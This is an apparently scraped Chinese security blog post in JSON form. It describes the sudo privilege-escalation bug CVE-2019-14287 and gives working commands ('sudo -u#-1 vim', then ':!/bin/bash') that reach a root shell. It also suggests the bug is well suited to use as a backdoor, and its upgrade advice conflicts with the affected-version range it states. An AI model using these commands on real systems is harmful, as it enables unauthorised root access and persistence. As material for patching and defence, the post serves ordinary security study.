{"title":"操作系统自带应用权限提升利用","slug":"网安大类/PenetrationNote/权限提升/Linux/操作系统自带应用权限提升利用","date":"2019-09-17T02:36:30.000Z","updated":"2022-03-30T05:02:09.820Z","url":"2019/9-17-405.html","path":"api/articles/2019/9-17-405.html.json","covers":["https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191016215806.png"],"content":"<p><b style=\"color:red\">注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。</b></p>\n<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"CVE-2019-14287-sudo-bug\"><a href=\"#CVE-2019-14287-sudo-bug\" class=\"headerlink\" title=\"CVE-2019-14287 | sudo bug\"></a>CVE-2019-14287 | sudo bug</h4><p>描述:研究人员在Linux SUDO命令中发现了一个bug，非授权的用户可以利用该bug以root权限运行命令。所以可以利用此漏洞来进行低权限用户的权限提升,亦可以用来进行持续维权;幸好该漏洞不是以标准配置下运行，因此大多数Linux服务器不受影响（所以我才说作后门最合适）。<br>影响版本: x &lt;= v1.8.28<br>漏洞利用:在Linux操作系统下执行命令时，非特权的用户可以用sudo命令来以root权限来运行命令，前提是要知道root用户密码或提前被授予权限。<br>漏洞原理:通过在sudo命令中将UID 设为-1或4294967295来以root权限运行sudo命令,实际这时的Id=0又因为Linux上root的默认uid就是0所以得到root权限</p>\n<p>漏洞复现:<br>1.可以通过在/etc/sudoers配置文件中加入特殊命令来配置Sudo命令为允许用户以其他用户运行命令<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#比如下面的命令就可以让用户test以其他非root用户来运行/usr/bin/vim和 /usr/bin/id命令。</span></span><br><span class=\"line\"><span class=\"built_in\">test</span> ALL = (ALL, !root) /usr/bin/vim</span><br><span class=\"line\"><span class=\"built_in\">test</span> ALL = (ALL, !root) /usr/bin/id</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#比如，下面的命令就用test用户的UID来替代用户名了：</span></span><br><span class=\"line\">sudo -u<span class=\"comment\">#1002 vim</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#用sudo -u来指定要运行的用户</span></span><br><span class=\"line\">比如，下面的命令就利用该漏洞来以root权限启动 /usr/bin/id ，但是<span class=\"built_in\">test</span>用户的 /etc/sudoers文件中是没有这样的权限的。</span><br><span class=\"line\">sudo -u<span class=\"comment\">#-1 id</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#实际利用</span></span><br><span class=\"line\">sudo -u<span class=\"comment\">#-1 vim</span></span><br><span class=\"line\">:!/bin/bash  <span class=\"comment\">#进入Shell界面</span></span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191016215806.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>漏洞修复:建议用户尽快升级到1.8.28版本</p>\n","comments":true,"excerpt":"注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。[TOC]","categories":[{"name":"权限提升","path":"api/categories/权限提升.json"}],"tags":[{"name":"提权","path":"api/tags/提权.json"}]}